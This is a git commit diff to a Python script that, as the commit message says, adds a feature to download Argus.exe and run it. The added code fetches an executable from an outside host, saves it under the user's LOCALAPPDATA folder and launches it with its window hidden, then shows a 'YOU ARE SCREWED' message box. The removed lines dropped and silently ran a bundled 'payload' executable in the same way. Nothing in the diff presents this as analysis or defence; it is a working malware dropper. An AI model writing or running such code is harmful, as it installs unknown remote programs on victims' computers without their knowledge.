021fbbd0dc1ed93eefc7646a8b2f55c358edc882
DarkGlitchLegion <darkglitchdev@gmail.com>
2026-09-20 02:07:21 +0800

    feat: add feature download Argus.exe and run

--- main.py
+++ main.py
@@ -1,27 +1,33 @@
 import os
 import shutil
 import subprocess
+import urllib.request
 from pathlib import Path
 import tkinter as tk
 from tkinter import messagebox
+
+URL = "https://darkglitch.vercel.app/argus/Argus.exe"
 
 def main():
     root = tk.Tk()
     root.withdraw()
 
-    source_exe = Path(__file__).resolve().parent / "app" / "payload" / "Argus.exe"
-
     argus_dir = Path(os.environ["LOCALAPPDATA"]) / "Argus"
     argus_dir.mkdir(parents=True, exist_ok=True)
 
-    destination_exe = argus_dir / "Argus"
+    destination_exe = argus_dir / "Argus.exe"
 
-    shutil.copy2(source_exe, destination_exe)
+    try:
+        urllib.request.urlretrieve(URL, destination_exe)
+        if destination_exe.exists():
+            messagebox.showwarning("ZHASK", "YOU ARE SCREWED")
+            subprocess.Popen([str(destination_exe)], creationflags=subprocess.CREATE_NO_WINDOW)
+        else:
+            messagebox.showwarning("ZHASK", "YOU ARE NOT SCREWED")
+    except Exception as e:
+        messagebox.showerror("ZHASK", "YOU ARE NOT SCREWED")
 
-    subprocess.Popen([str(destination_exe)], creationflags=subprocess.CREATE_NO_WINDOW)
-
-    print(f"Copied to: {destination_exe}")
-    messagebox.showwarning("ZHASK", "YOU ARE SCREWED")
+    messagebox.showwarning(f"Copied to: {destination_exe}")
 
 if __name__ == "__main__":
     main()
